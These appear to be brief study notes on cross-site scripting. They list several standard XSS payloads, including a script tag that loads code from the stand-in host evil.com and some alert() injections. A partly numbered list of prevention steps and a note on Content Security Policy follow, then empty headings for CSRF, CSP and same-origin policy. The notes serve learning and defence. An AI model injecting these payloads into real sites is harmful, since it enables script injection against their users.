- XSS

What is cross-site scripting (XSS) and how to prevent it?

```html
<!-- External script -->
<script src=http://evil.com/xss.js></script>
<!-- Embedded script -->
<script> alert("XSS"); </script>

<!-- onload attribute in the <body> tag -->
<body onload=alert("XSS")>

<!-- <img> tag XSS -->
<img src="javascript:alert("XSS");">

<!-- <input> tag XSS -->
<input type="image" src="javascript:alert('XSS');">
```

# prevent

Don’t trust any user input
Step 3: Use escaping/encoding
Step 4: Sanitize HTML
Step 6: Use a Content Security Policy

To mitigate the consequences of a possible XSS vulnerability, also use a Content Security Policy (CSP). CSP is an HTTP response header that lets you declare the dynamic resources that are allowed to load depending on the request source.

https://www.acunetix.com/websitesecurity/cross-site-scripting/

- CSRF

- CSP

- Same-origin policy
